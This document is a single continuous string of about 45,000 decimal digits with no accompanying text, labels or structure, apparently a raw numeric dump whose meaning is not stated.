798567568298773762247743890058579382479857677733300527193890037473274940901170045431428576860959565652030104596773307886708646508727544456450903896524859431783799921839892952176437067866289684297929433841706924249648782988451723153601160614036085668716948806708918179013826413853725857699599978721126096579628907497346681573048656195055566948582004826252179402890205457493332051216621151707576069558294311062869376677689579748218407065195078545019143291917516362760150765261344256206266094078726381783743407417147665931990575124180146569096586216010455786909708697309537984626334326379624056850246564434566677034360162116636285606910098597780333009148886654101637819101676244257833682482236288493028130447400110957547668994210618618643146835403260594386419575736129660892016605043521470811946165344106843205931898981646491160131986998645565754626894808199113936746445170594192370574415228565163936396400467173775417452529405239591595132835650203131455174768172212830724963948211657659003788760105219875211281545968939746941791317183148393155784814470011978515831360877072598010168869748039530536073210918722741165728273313103449338822468066985660817987945413091083981621018131371391058593104912769217863728938752395954739705608577563096392443853064861616082066967260919493614923289752470632759328811729638554391543414359513007124632584510113929734083795518252335796867129875039181645268019347428646191287521528576312294445917626238471014204181132214255411024731939638237403228184052314632177922365894199796074849922515780186741096836238907526469168997448426205642716501231352281325667281383170135038155378688156280681966920885797104812331882450832904714917074351351979369616019828764006682116102224090163401053778573843348051036673760058400566148128330709568716608731920268774100573178301829042192468622540476493847157082159130212855862333974141667670308272518645662777550617997905355919177789677019460413276146674020771624955227792156525721881694115650688982741877195810581137333669330814044620157191847234295676804408327662026865179357182755058521740512252640031238952119750488694842495262681044327254758071654848080983664829460384548028931664984622983373924861636337407476776902300877511505678103116751982704911520447138604163150989119158258899743112552369505510861297703659116095356656389138505300178115842401010195126291503896375482935064348112637560851622485959391259624438326888295737397518459824424501975622311390129735701130195440016510597149110817521878552432787496243861483601183998973926392421327487423294345396371272988968154855167428029831695528351638597229405754821492905805769848184700145106097664977882542469676100246799379849298982016304558987680830368730656912934664156466623088898906961002427856011081980734280535468872832769881044473242772402362055894375982251653433454527920634057225651907711579824640029162629914651450496121971859960494230353731831633511951026904936712755633034392988758709445701886062045102618294231677189566702022718341021607849201891202293685000465532887817368245179074827601587526540573853937863180755618816997052047878431027274989678582324192092585481762007510765622395779026605821807932521857581421025593111430565087428803490304613652984566905344208476683802066378175476423160741467852730489708678341454474018414072864680657116443369151036428698209781662840496311176088106522121845284754756210552697216523044448334729590174097779342645330623388135927411730915158642214944753922743056047934410131291414356485870702548006077228725153012115672243522690262727585600684374234643875367579571911459984572416732117755687973460418011005232457569152101223723973554212068833094916831816106248748456890888719576336678354951111445145568388999570824602017230611659460698976090848024375276383099367975131731828775725594532903173447482089802148110010327655996779784683207141768350126631630486774591032453087425352105521922232861327835352711306574951873494344248126858133666675376160872763521883273874478856106219860490463007167278213225438317566261464376962084956464963048818484709446378182752394996275464653939125254991959632515200758152173501348591061478554220137532873235525862058244887370903287272360740910623169526500188735736286440853392388003123710034299807883701554663620799910938930892708560183816803028449828095168683664737848201606769571453922660887913185784744191879793604245979584029889234080952320989633488539369225252307324034831458061787118853560757759751129147976301782687311248236394359470777691109056970136935902719181091895073122194702138801878343525098224424846657570571986538789552446887166833931787445422044855036343683482499066989974760794043674248173684612831133934382005577583256076249662402622528788244084145808108196891273934446006516802973928421183008566988543474010114321648147167947925563676756372692947148853594199051382892409967348747605640383666937881001079153342481117119735249813034877031417230374824597215243720220148730735603438525070429273497480370944356285353204358234333116104083578298437850501997574224143562345865652661054874636417796614130209345333588563924660651522810876301171378548246272665415149169726694426787279756582193362636839607330379872713538928533517400738223294079770042800335739306831858628663962035919602354102633305124878460182218254409178510983573509098858432308439237333534181097611468863055868938990534922306545282487687979188352670194076174451423985094056156690786618634765065885185919563749125575073473921866876770509763501494552502678477535503794601388975106390154674280825315029437222231132371448831687860515705006394826502438302686139570011044992773925568854564383370938476167556711794100081624706085624342365402997351050060821573136934411604445372843816399708379474709635092801702015890793678211192241458020276617871142186784717914479594609423637689744013002258375755155693573809509953696520745566216739625912036880408408034204113296473365826767834422994358257972815770341035544783225932328584722431986263456724301683279290983054980566025112721666754803521174112848381595037396519459383673697625405612145761034727460000574192832513033354850336949753973917728250670802776250213641417094646734625765068772021822068142109714501430831490385455936663303988605823680718055646068559229431433823396550553415464810615945491194657851047383873069991342833198530039174412938846908978628340011743509198257400440244994168711155558918822420278341614733655129088478216832319250137379481896118343325451614915746196897582103526083203123341015942190768611089601324499633267912222404721624402001720932481208191670571970299271418051323980990092875892282044762844975356175810480956088746384896067827736142022190512351964306994944240381824888244240946774587924778519516297284541956597987266521700016627570615005489044465360646528144970862459671314777814594357923222770418370277472269871638209677157469680497676862636331716272659606378922933524028972828696923987252246930107924373024708480475373516401596403334141685138437303754495346957740380695020356229576950316763657244837633789993505136443952497189120199526306854678101803608236873553986038539705302059192290658612527077290080885528292262509292165627968121707296409124842025922167631607537176473467309932498387289477350635235889536992802044244007627929935455215225705793120221034225731433155767423806633776636878945802348694009622245307439657225131947250163745001131474023979523180921327358627410357498157552589550315381361514726631065722673266473221980538044368283767595164046961911830474180179251610609878938641994025855449483732288034461877309880951368182980553592594822996193743243958889919436179291436301726068185527123810007113760789916171131810637006449145182198348753096262388112097986011665142761214692372286371046231887524589724277191747767287736084726037122802306918420152838711141429210283908479123028458593100146284751326302212606014171440808416451170125670233599351515423790141449903661109361285370233786541617221272728366531566597579602698657754417735168787115417456864286403653979558142142518696915748010397177050453532329792804799644696863035968959695491276458972443128093798426439013294003199666379163882873991528826771846915845084415951058532477861259867368991055703918134555727888141364856735747723700066513353994883108392880945530824080198853576580301934852171363323240549373240743356885305706411635941830840241252247459053206264639450828880948642248794208024747378161221211414867947631463381042416539164498434988844078099471122559860492740239294659778584864394813743972032459380852250001260108788895086172622895028299646836689686191177547471796836670488284321126734902098898231521121676845443386417997826811968172398883655708056940443319148629348444777829201055458650118896332326778419779491456753978837145819334831588706085093027788669915563263435241292665752236086045686297030052736338317921235565451302049357035284363333812130239479913923415109764343163729929435934339074684102455789563363827586517396736528285127418265014459206746647243957222873068102899539534202378997095611943043723706761420072078966972361248164554911986004088570244994379144529273579297073611520027406404959454314525508523785563588618015230607189141604295216477411822485495061671384704370976063499369823293723040909609478786655573055933930186821807559577892253274426469304321159689106125426812250418037284593707518762960690375907187305376369443218297370150718215298855413350702904611255758407405561439437448533751038103920248233937777615258820582872983186590238319252128801239686413101537820987471367926895990836622436645390425157320605061525102840969035649726564138142606268801186890933109497761497704687321704291069513739560601643855125052199959562048964411101765729724251304310543628087954126515858660472710945363622854467925818869894594426058701010116934893726625416301374058323027005435328869710814265268763226178435074119321506425894263839407601137395027897454612468158364601270605167643122541982841473779486668575456144024113742940380048219169724643171643535888396328874470080280027430017479595300139553865795077204854708998819165092027910282656545003569011079324456553414693169323288601221332909353278419605662167846885315164384678684567958157288935040333285330095128076820840229265172697659449647100197039471010984341962898801116425761465004351898212586387186015956343042000202560374066362950944239893892504843591613886061784501598648987680095290256361149926915989601735912073432693158818996585533428299272771985930020043034610769050236814624473266610472651926577966734298075131859677096388625818141476859508664463264881290748528183504712630061236838476855022156526404808119814203267677717744171983653710850227418777257894648730271168259943207436863115958229972550407542138483883655159165149460549302085318974166208993744819575777157280557215546884734581688945174560620019213577337542165747450930142090209529272853679517033544481903262256893118406054924668204147635925627469905050558807560634250589775829715939762153797525241819833486598991015650341194382221066929261735707200298568384022949406642436348208489578733344232109804538638598017424975203689322102850764679137473803730835708760990949325244196069723955507576794110994745387677883751703690591939867111644780700082402800042898557939495690137255653527790289705261713244478403133723096264386744715446251332674320182380434084470429382361980550763673746728682422939543250641937263189931537431614478140148182424617970961184173634790349517345854619658786093170471028424129771909324332642006441445160414966467372965369043394234588409904416546396468145333381999402472089551614255831154065262295888511337071040289458099431056537850734658320938694751536153944550330803488303498215090649221479746163100193291655508330070826415320121407505483548045969359825779947897974397985212192931156376531130200426884352209969906688221597265271233821204521768812281583149413423833226944292459948658442086957647398340514444969932882500348844936814615103457239986884127105367699388485742916292251197736661010957004662619628800345419652152214990786682207182821169977753312032830269595597553003958539019061120412376234225118723275679861127389028172302788527929923197441269851445520462591916435826222622816835941716020524500396601346219059193051828243140390919375611294301046137797139004480130616127104910586385382935057338496520246581908499687002273589979965606964512214720243333360406453618099578698350923488311063117192362608136493001853359181247128199162576488758501016433069783851641219635004779911593447452114092448984473144563888301296098911325666698905738236966866522822613197130594469402900533386078417045020424839240054339601380385963030207756202947969736195399982891549842526521625691186151970919788882316294077818506719563697818130498461953063345938367661230449041953543607638047244438777956339504693860641886084023497647887495002013117552909462286733167529778726050919540005651197283323683525810596980117964147880429462224563953128415775099161827945848592207104564504774425269716572489871691595751967517987037297750696994435294804834831174050357314842583157665957668864274780093639922083454830986457993481405289253155476944143711843278431942509330328213133308798837085606966597118024347658067780872736703731753783858692929314100502012519933132513607779271646645554946927211788077100532533913275370437601958398043257177088710931999894322832432344961905053698933585905468734003329934295482016041423752797877155181023517933889199539000859152043576376855061764278471390885651546315842516057604413755306378079091973448235149220740400583216526580798901067403232040905988093176472933666185642443330513857636864443052983586045458638102544559430068427743185102977391620538446795200659454791039970275882793951638809234150053178424174385315957638746076074553187658330414043856201505247782307333428015149384462766467454998811682971959687628551373493789701861627192392336578266802731730648591300413018837262597355626738360199165807315415477178558478485759935122143929327601531539059292064003232940341664012491844373670970178333830009916921555086135893012424929401651189342020583684388971965359034767086173228351442758029826758266871528322836973858612330153172119589814357453920347335706530917438347051795487127172906704450022212268832846050750291298853554605330431347455114150835716854435765088421945306672863642287821554607238605744909066396448337012658293449461466597909958798010388910541952358226238845866669714074647491299982795056262105952806631028134201875498357955715498927124183017813552748652276213388554053477081512636017272672447872958853770064865917342576412419303832307928716755127313632066765503669671044074132232546293764568164864386784001408647667384944960954258668719870014931746803917008037204325342449055665829086578723139318604921692806788229641786838812564041263103981321037511549581377862263103829007193079189936902362621780781291338702854546165426231525968513481754857813071738633113245837191837500697761417377709914926674830579699349903015588632243296437931318746386567626471861645051260318293086861945315585854620884121959225695209189738559284221145792719514928131720100791839703735674971854161542909205029629512887580870750342640068417551249474143940084741478129917575806511109771070963804391633092284607339787971887223996199472751337466450645667112027937943706160367515591281312431464434169796724242034296622469556523916403139414103366810327773519417591321894601617440571767972653018892735663110901988511571030330870692847859765537150041004906684692075931151860519829667794241369421702467106078132465502902412652445516513689161651662789575216493868110438851046033807106231774831091788010540828208205063481750303910881260971607066017138570498005592849724125513756389340591826675197581643448705559601002293560534250590668268027699079456153195874722788204878369519625157063555260914147411841832738269422343778556663300704302840605324554097713440981316127531646753228183896175228548917893380128507065124506963683099309004596879717249304023282606857635280452548146238895995562614055777406579372123269706709560612909586988948862561396113631911549037500759955868002631274661646871248912534969448900831906807199839154945704945050888152438059774410041418642577105498086818414516417714725627131599719874742220355285914475871526849394606956426977790399834649141093672969242853785214227781509995609729647096339009780863674654738116373204213145394531663704833168824930351257253748264269653334728003178899275624770316558999075290965756097047348797058418420701133290194039966446432460882982673921390909298314973527221356428108658733644092140114708275517928559097039385268279006380347666661834909537481608919720887140532621711636126908531402962446808213630614330441069333254106763677946242026031636018369063404453956106568367540555265812020995014322165291386967802456118645536681426965232012209274984671813806501438379355201821651819348201467350611227449051300768395537244361820463241040302493912764853028321505720738184287244187536951281131528258861927721154029387350361547827624374622627464970138573990982052222474315431403470482709584470461253609642104341863859229932581514629573292783292362145823597406389875752820921899397466955026699014241022832582343776431978655961132649988290093639192514295046589231116013592535390636216344470837124350601740493334761167305356352290340174771230217570010346226053698179273602276264240780791274965058794608860501585434089440130122588463056364659666716979303918662221778014879468873487321791538415218594347385813494458958527168088307378578666115829970438742413698519017337393826326669188754611222940047168497642644257810239674174661657654402019127406617071283516809154131648108100202009980318861929411738824340012771539147096054488468991712965799760347941478962277325932462808322504139161639106030186141304200335313476669014700214897099937324421680110399145367784707894715943367506713372397061973993818102731820738598044820381161346247103914577831655250131502167931443303305079923056084091623890005190347836224063635311600613735514824566274153636751655865459352147209516521072817653663133545298646188254364426296962103597810308696156538085037599923725782003766885588330610850877233562576067165514573804509395198174990373632503806187873670618346559492144890880408232184572213820478237251847329915398348938334431094780066351795947663408611169849983160441993728566198372854227255484960717918666634298232269333739966262634701196285558366801934271155592505339361233215465844364284124786262211747113398344740328867245327806871078155331298950278283318192678141974695881355496114386373140746292840795266391746855279670414689952235013501975329567453577902321120690832919534325071893346340520863937813980431845337579898155357226129884787027654335111265597634960237078285213313897904020553961316786173282655001659659555104798652275681328674135729630907812776926170524724732695443971153553687199814321104192879764573243306237359699745715613664069342825324490607677207771937507554635805734576152304742930292199186238014367030790255047908104560509020110990912724334494013968725902212449390007307474637173622107433914930406168811992082155167168294253294014424707882074650151093828892718029640588044140086300563079096154218154810040880641697376074108108724411025917589814712059202241082040694701768432044073548359306599577733233647646915517751123540979601665369767598384428417061830185732559396101916253748439310553360898213428549941879565596327343185859669476545601064951404633082205733871112665562124689338777803673461994725276196254058803552468444690899918828188289817051684638343820606451281847873056866698063760078500610349137758353335169176096359643674381298828639231911666352891982031005215264977746219368085439553593078908079751118940207448300407945758227849746871253109818108707296568813981485261669518837308049851922640981983304347951847218231497838988957573938830811178144828292086751687624040233233631631822679283649227421563773882359339878548062072924773302404023201792053125112253937013496514784161284893235888622346113397757931335262053405726656282024905219675124186028567081918571224274408044887577381041556485331583873890857137081647740131871206121046783852483476474003272232236657736402046556499908697859453478905073227485332130606182113660408287196293069845615045301659142897397528851198325534251905226464969697875324067280280377342051955211845548338240827341135626337200689287615860014808343619135841989915181939545609149039258411421807861008741082272930392999429802640160329000063618081791575429331363494990068091745925619347729324999302059212249469204065646719460272773560412143956588078506482616910747949173161570199351642480464357730566379742773101674055730510450367411804453816234275680607962872046613478231806703180715238814683758877768062176514849308344948384733515938679080463740290355785628131904903559002365298976502900992451167538087765158940012374390575093030795700001273623574731483246252973242819475479062250893554106574694954226236481128622884538136228346073978649360554892998921235195271222553709619271570492398787740173677621284134289756790791556660437085138929599811355032424004124548347123795288800602290524890773810290558267838012059742192377211604357230173534148411967081680843325708334397719281453173195704355632248097030495405261811025473340426907861506056132247628020694522897577572223996091617347087044958339685206476769227912773980626362479280667750916392822447214575523339240245275208867991643387944093633641726881920619572481547584085130630955177746214194050495243942947571794952726591550920010291931089317545355607273796589831041241967648404886820621774557735129009046975288913539962792107963690447120500513421920480548340340053728081361247356814823129347366758190848060168714488280432018680309654177937404376137313783279279074456293322459193483283770669206569804392795500476686108227248214219443199706216886558963541514718842174168152221370109401167476243615260549097589592054386453962774174122384274225558041908104984337405839700470479162917589868306574981693908737312506285073434587157141543606915751903106255936589799088596062775060083632159022018735383570993015239428365946509409420112448926010958391511438599620650233749343176325997479767407187473267325442403737130577529761055006492446268171078741253865864515794073735130646440069230337395573841251885968955438864212580343573643868131258621938205730746462854412571220056216224498688562351128881179988968557010085188893869568933655143462652020932741679635451532920705004763599604383297119395607160667212949004575853782034562783715695230116201150513138354337568120782942785538274743842981373066006478458269805146601347965180871506379039766390279390389931398605920695379213581424542068212629423026210866389049724093188486623533298452898550203600109833496479255617589146602904430696580789590527625318424815638143477520382103463346372494733979029975175447963629555853387970654116091852319879719551331333767526918246096862716658715273391793034139731217858511377281761231145966626969417488103135259369146406306645917806287887808293159818884597535629178621546345711100400589576992000322988702645588869629755992952227779271476651828497034913914092472390827247490290569386208980638727767148944761737496029497985204429418519056447191367300201171127712063818887312593633958585046604497322780885374779501391235526396605043753091565837069204355403764778844204756370852171095411840126873375753081832907847956053761062739507484111097022210096676399457125439204125526166406803494749881802320557470993819978905111193045417857083880566988795964141322586572999478989757199181082461780009812553109537515228382106840371144392281487647391849310683105809023140658744410237425519992933719509256800607942438111952073247554636389459073126410625387247404994522171164116557305643180188722446798562907937102351176046092544569700841887089431329109267292569073333858574036134451158661888120666650591598991760043226099329049300362110446458820773508806836887899664916377843774811446109221678134776100613694898800781465091645711320185206936427678561305058264935555940628000954090971008083820022008105576063191570121587199480620095758400418648075506009950712083508182046708325288550173654625829904602853640590427168239285165126254483338998208847096161595312416371111874514904193364947677598114979374627754980749631865860415587969066110347905717365973381913985182030140363368853450048144600030012158988042346869814748550902360425063494181117467026495034558002575969878692164289805601602742870993026345467412341916021934771636848243091648992531678055890203071545897935036843690009382221306166672441464637957568415056452300950671721300215884952974662626486665873012391775088235832257675275627434249305455287621983907312469533021331659956027101548336985405728509891770338379697853743039777346604567773144845597434960857628845300760902531257969068519830120327580511616838474941979990015746946480374297823594605530982405196383408354623281310163267325865621018106803585259631377333987367004102435853738634764648860202280671570021481399124762103683415368760548342611009816391168540308176023766038161336915707212354502582319028785945478115783284863779568209114137002887383350350876378797414157672413208525930802337415583622774056322114655962021596841808719863122657024134250986851378458294798535070663190615835838189709465823017484097644892555819506996465450322897958212085431601168170389901895659507532095898382177550483233240239397144228165080392825650591497880541652466260593454736240957346343681762757427611981317735492752337888026967392941123930622578232622623679023221078542366383299873207934188095178841087947955563926670356226957370898998370904595696538428567701235778328865073558973598422176228075233036210898674715680714508397873722712035894927545155962237146873498728781265284944673641960501245878155065838367299656087053873003151037958640415043061511975252184659671723095999204917183203005632659344620432796924610553135372493930755022554644356052278141526256133927225825769900118742719584608179818124923774820837753790276537488133211353711713939160480420944422351992495106619152680675495275883931965820070141582708883684681155632779584602189471721084209846075082532084840376419992610970104614769855013106398420721473444353741871412488816615311713430701922691235891344955731071252102999908159432083935056688041212127805292042435434590905310950496369226734919172738990197661385219772307590222085842564593767312804779385074035113552328286202449325638471919426402754905802553745997630158352415030597329047347391930725610900015150048987869037971595923836266434518051720661107786371767127469775302712255774974700311780189244072164810062007497104890801820287692394132921756897046478416780303484388961342944763228697954416679733516223629196594308308672057974142449690226972620634462775338367509673341175188629353411018992395857809870029208810846015532446364616570682731715704891350278046364046509015356917180144327994022289642414321507645087982137818559980261989523317257722070784114070566276004691485932736936882271443054168868465171565025635059794977051618242411100883016479691176983552986809006135439870773503806193492739659299974141637014925627359746488474541465416143066968342670721101631351886149511696224094317628292127044892793467095484680558128438051998198320221898811292259485847321055095911403636395108952891931116665443788204762649136769635034325664925006791299752959038068555349844872458291068936613385572889658799501219270885346808907414089695950413157563176162879322446888517360829688346082742065418610676977370755560410908502718659939997261457583429785199370216950651214484929502723043609292761185059112371995221129250220085172024523528377396175612987645659273591670460078879491395616253223783019455479184041344927507898366290603298115560429504084348989879152513484594358136010540384368653347644757785056285212645518936931130468713226224298204150114734890544064665723522716082427048560393131201740350606190607683001074045807264553355514142761106901190478473897316722524310963592946040988725894089336277458394310137582337830897594740710881722933631768054225813173013713799504730450489952595643294659465999566301673618267934578893471988169097462871399467302790188210951331475211655643375504062426097261607868081295302912957077745994758009957108151705709385043817502341852184720870811809975915249787942858663371669055850383367075982803624186137644953832460785773870726893117896983676198035248599641918702060342004785944187090973196037564577287840841150180501976119541073894926467434964287399020991003532115831378467095668576816647007931128115139590719996753399148624508016485972700845292696221870609736953942049136998097014782837451206392432222110181984210069527752758935914636403740998496084373680204030389851960607760574094054532153733424239038523539969778171091969848643715815723874007024480350641336209925549014458061957274090401380553007463692766722302722475558537559246796058954496040895243010452497525403450296925772792536542079528010493190992835386449285189092953523954715605577055124635554721368605730853916279807019959665769937680080793309432673640398700895610657655718253628080133115611915982287086019273141727799040123826935874900510545604073667259288241230850115486503861782867442501519960020452416724988729516167713868921838518738892080267770127509654680220156366340899507998209897998866084880494256845255712121298764270796172634911855514647642822472020038055113878545453919919704818436343740784332315789205280017192205071772211776167024883742260217211459886746481804925338315875993876907925789540337866330132429657287632252236831502328950817415549013741050196699165997017125570716367834827108186910851199872354951701963065942611805356260963273690799112815816513707397322670576641226852900212050704233086510356502572936136593978763463873538205821171989191280203049777197622446739120700582601934527767662444175504246800658328780073797664930501823742453091697519980732488397819321289321589027403332226318623001728326621012378590890204100688652504925458218850045853092658310121964614651506556782893991812692516878614943305775841704893251286949726376778960824295125421506487001628840795363239568335123302870406239446760624066252912067510875170375265802784714692516545826707964612815789554567345663340515379687073060107390496863337701145349035172947830584846513037602547714340557103773299328517806722852389340801474502518358907504070940965884499966800722215165949592436349302648860409357231178872856713258794865985225550093292660285618212035646364561392078806448812164884241913468830997239699847986978471291951251350423034976005383897882501317572762016415768538374716235694618924964155055547198842962726013563590749134074954467882283002362833064321351427724609381038038399934646387038320661791819449648650912701791081245458476861976676504808064047637084065297196510488011310200062867071672882764342519332875385716353602519980931987585918085195634572194956950714188234055395282493953337826405068813689036848581726152179539134449645220943000565281031851582559320466408976462775334469698994698923202241068708047251858555507447968943320471495771486657846418382878221810103995450491870862014445850674046207453790925037196847216047535106375376135858291015222070411753725935441235883005825998987442236546174696854749198503061503805905897777495498882887377677389320681788880155013403860024291134912077276650290024746201293591955486459175569450026730718520804136077698286007619826315083193016435930954661710750896020227801943326890885184066353435950023568223203223170522576159972542576024703002106733779535683731335850821704340818036802329301081547443654744245878494253890774384017352054629035879065416358122300536331833128375618236340039453807104932598901462230213321445306721548814027547808805030113259617698448682168743577337713449732506989533400880395710034510038501153038277248298000070189383067448940241849875199603752300359079535085244268699817669576392541618248099082757567887631565145918492679367053843069385946881814499006076231896613136808440625963940835220041406630690206819836890903722962735334100285501838432835851764204955583371444628296865085784313145489656003253964191044590679034644779828666859080786344280136372523595133731021837155081406383434406067410345635457552162061551446637592849080926193396189278251682523775211581427727284005225263231128785632149055972862725575922162587150031324130352397930051509013505080602839380738525386374972445536933985521932858198582045559898976097214212702976232321139790927069623065915219557622687242692454964340628723890144077164865279317895671895574742119941612768931965440809527704295561511084563344412405247919728950322248079144811436256552268243854385153615732599072359306718311107729870558793418073213598848562864888052782319236011910054824855223427303844056154732397674598919462846949921495477542093783748931638581832033029091827777947697675994052892196760823076468821779881774602412888977197485618089343595227611941673970464997508703054048182598091360434066309858253498632861447504680234412985538124110760991073899678131932210332628269375829217748293918289989464604659642875434835125763666067255705331372804733600940356126540481778726843255859305416997995133961209431822323252602161052311559693632034312830715787560968775203135859924828995279509462466320579174699990523167114214222781003453137480321926688537541811219223773354003883831357160540332412911422684544097907392263186083305972300302540166920518881576007600804264316635808748400810689187160637028300053305923286613275840873913902337461910002204738186217921695400719340763452124479363524631072761984437129152560425272110849409396727152044182953508230072214210722705183921051225585218002824003373539055616181579975398042042509157194503851925218886472719705363515834479227085358916000827709786215573049136374113370630940057944220969666398110764139447922900753459060394298790557367141519357979333592371280341010583346432308239198263441530197477642770978057846863138732479491839867763995031240365765758113499847889716207174667050101926359357002239778092547208989608572630963318256909675602272226038814069849303464438780292916189513193361951981536435680832435059816708551458849986303615468660454612323694941215849285900531342180369269924974850389570319213129762459418440785102258476144000332465532014857008853661788634405255454183670285801289712983770297727286192414691814016777269102549071368661910777761339569480868713928578430300828288239717720063694498387959491598300229326408546427215709764369931163055654913624983882165134669334472434529050549652084740465856081697626235260680498780562051687318181999421512049763948192660642876107690290583893567677922959129652051100407588165757707548092204397258502903647195492098098977299496133949504579426675080014279331052711897935088755128036878380473378663720259276076600096259489540708556014112869684330302520350279461778196064453408188572219324970228063153944729622489191778755494507350818372130502077307844131160913803927753060626828763875984366231530383118721221483418112820081316032844878106647275327128959334326473224749171159739504169744476527808439293212809539539352276765329475845874317771048159774258891835330647648519383211335987974039939443187981244867833239652549180951549074387462487526130158984584222094415551972942702890122312508825285366505151744742492871452554007753263080202245511443471340432260287547465923228140746870651652992009434602426761815388306254712011257983138313209551945549205936867223570706490127913973516826335579157420330034916283540747127882401686458190612585777496129230925441034846218765468085112202096373953447599538751076082658236504576092553575633957097824289161448248141047405207262830308331689641804441962070304676829108454839740652501561108697082601131549608644452020825765188149549037103398894166597408036364145593466268200033843305371783507142256373024499001497175797588667310111723514815636046765871246435188882169824327292068665149909036976716646270469593733624639481956218806856100909040794880318903011128688333837760276716069333940191359328360070421161854924735978052549213608145941718775489379297955181818837804670831002709826385091621373094454558554030142614943718230845198173543086594604284394091060144314542974275012191586853580803948706882697615706709528843464410128192798305960310966639015857247003257315799425154180471641892125823541692942423000144710242570154149937663207756802911367439255352513318978958916645117362244256744575963117187796465325429389893528401317072131381710610391771842086683162171765783627037375260266882858574427955483919285885138254404676546981473081830987647259823524316459631671522838406947326097739531595718331304227527495191887786552414686233291457575990588387201633927355441991473508827990530455931393978869534799203562133596198022316697629622083752862560231983728977138947632447819481522129173618532306048095830060755927434281202716389650031426946037131274180041805990388724706192498079756536203836675445868876675406775397902958646314318704710640238871350090153956631048417813365461219224196339751323434163103131055442031987993680131149940022586342620190870757739357842132931509835767437162939878759267012788615496745758920368869809571116865967698074449643875923070237214075238446818604143400673567205035198075230039564467460133223583365191096078065482670395840483105035152759483865137901613386163755765655547494860007835491216978658447126477073067582477965822812436446848038507944673575710958080936199071949328628879325366265319699943581701518471930427225780824005730527964767787373531221226113061464581147169376814009663176851928960275961163784232944266059697727278573763150114654140948986297369353996927539974182983370746616485381349976235431490044339793623689717765904386295705079920330589963124849497162931745324365916968770925091829894543208574898093535878877579609804306373734312821941165042478188695806370468828542931240197317086683253998068500317746454625260246852445667168170248759493060726240822091414193631280280186945915199931466309293562003157220770485734511587367924049608897907175467742254228295546927185096377264690722425163855351634680665313702767449668914797025835876857498567318660121016417755125230261166138159845008952607417498789493228936256972062036783824387852351442572773909437755463337345008424706410050889371029808987469583131183886182576074958962753348394400144705060866629549037321372700835499957937342368403336517629037265804616393492578589314705782939753459420086035701559753269955501042453822566654246744516810319553118651818103828558013643526761730372929942026757072610405426218857807417320389776326086902199015146689454788532559169334596293990596358836772905884039067859853319239582373576463677680642593866321488550507069211152629082692322496303985863093224626636626694536258535668233154196887641391647947420542496016005002076546502729490080448085952631171062942867236520082326331636450592890234451959403152579319050210274561407215138959119460273396191606097773396883041007879074487775330279700821402275133057378315638085859969222978958319007999040709513641677097107034847177837500230047280278177213840617559142576543565773469596124884086563901594205180181496860988154738479439274388993968748457241316218679140246213805530153875339365368562044513791522559941920981341433775398791936562738495789415969887883489289844224149489793932800651783986109104788156936666804530350164003905970834419149212826398352377445344847276828744421737400010944602687809987285710982335281510616426073876339386998625641246922327505419481549437139313114716660004762622328045960016905782265995967563633210016380481264430089328863235502853361375007558478809345392827026045008580290422319081892185589185697062071384763209754874909879019548348698850741739971388534626669677989631878747690169657776192203494651249338638914412994770609410482545281254396203981199001220914874042546510322083270004304182923567981553550437652627426940105805325496435996703083246841315178595486919694393971243221900574902374747936568844408818993232757308432976782158970583989473882154036507669937559013332061939170131243350073740752827799186418573735963515132885354801183596758708740757335834794014418722436368850262715352263908919529485692959067620558897827468110373490406704239681085441020521561182673103661735921217254283474662944695346504608121356095425029329754836369191735876248885245817478753677979489321444208010001177844366052831081647379879665152988968331051833209354994389098142651286007144158541190252628136500279372080968429022364746700781897026386303193501157264730973624827875751091129096650271495695583995863121620304157770393754708335171604709747489382496940418210125165600213567558514577019730997005042610046957361099663425999734017250201718619248919267807172113813747400522448054422508267296416553606295531608675246464066683090919735582276293163095396147500211582931465513707382983111359804730677946772957815974074635104869178044964496934221986892570412200254510657666649009484625890472661011260390140055434943398549944532575163652276195375758701074690108402193335964404867149816495481989989612467097928365559744304588743164452210969158223393419957735872982847322298549667065697458909445429314935469443126380228188948846662434325425481896775247702016690895795491289201383611499822678110295525988873673412982899255541824869459154529011665258251256862515995378326507072847610519381978200313035125266946398373964007458329613911873968285403984223859301280732832961861284132386791067855024956997325715036321682353725447811758413776982228940200697125910221721005446334434207091351701743708515873866609061156867384545615403216310513336410782292277749106121735739837497592654035446954223601133407834559871653428056356977673663310998154126051349751903829918046156988595510078092572264401564236042648213931839589017401636489956274926290742062138161228658236265228275171223872179086774153643503179876286368616423174108403534928278863861188840876789654960324639215088227568590747025980405603538164657830078336645231627298812565774205302050601543912516631835361796188987639734580208769368024173844961520874537819912769211678276456453314476719476958618449932748256823628543771898617003303942276941156532135787569913187423607312207840369601282460137494106126589350361059327601982117565293556226627922206264637416993330338083839785336418418651855947656393804751907086802443762439465349220971168629712948567688562525272349036305158030432792237975914720993695605061222274080973034087031705560168296841954268726937941642186309588606956831173014410165639405331838146196916889494200299713664338897915158158454551669798164478779136950505314892765413213531506068893585404809008120730473378782284097725328558356847603751987403551729994960161105206008131038128022273889740898969120483188162837721442830337381977212250952072244459917648193071776444480496825901917130238714683149644931234739508811909472484895618606093648704263494918424640658657917465300112419343121745141535468248938096526944569451913976871964355822203420827405698738931171255441352047684852118310711658948363658852110843144827260791658836939054938934112579436506768566440385946025249752069672537212421667232459384566609367131987797659830550610790166323636722718778985589370518361804516136776951257888885374224399138693083696967568632738016413694736140593966500371824335753209267050999848750355231340824072386891839718250684978826690093623471385761953639793546752330602601682512273214447160835507571147277656563823176736495947079047310056815809661962134912880787821736732293736574709531291804105973712611432514892912457691045110060807005887524713986801581542464761733121767075686384976229082722956210041812124776434094846073645924942334279454099975251220313721248143747602901982918377173070366962899554737156795232947421334426207718162085022173019187300889624538476815345348256857375390411477123059782277219260550622930522558369066670086316231045108491879787903585921090789937177888950576157747574825434389781490390662507665292166521349152987185716156769991314962176598137893094231658857614472728776046034162834491300899914575826944256445720177108828432776982228782695141643315675382275424318153033778565714926705148701724497272130043965754632848376605288939207823270231416226358776500287207136233221599870903792188691994814762935867095166815969689827344517014812613440109817272487556941250250581447600619085904085500696944085663575023942727586154083553294309244940205733999548510104322011399782651250807713323996361997836636877759758518544302177330862075881959202811932165752783783359241110617739996374561360121649653963737637836188082961946653853755686970619853345055887425694288044426681440538539746587281498518547656349921371160380530639059672534909443357052400537206419298640741030365945317379163196955461632823877207978699366629403742906725180386714697821968392030360080080283827083737690216291700368345423485209925395479456568640770239756543943018665621822936400297765694497249434072895617716068502400577685270925706724838968608756552529157852050520562826738522829705926505158543566377508505885159314517528672697137298250601554749770656927266005973599209682663420692777973397911414709468186654420662068758912869244356579705503902510114616415769122655421191743908003940615634035734293971523377650903075858003369704308562753480546711342935169591724465601526727278988216589274895663298348538129336557209061344077762067123227639620150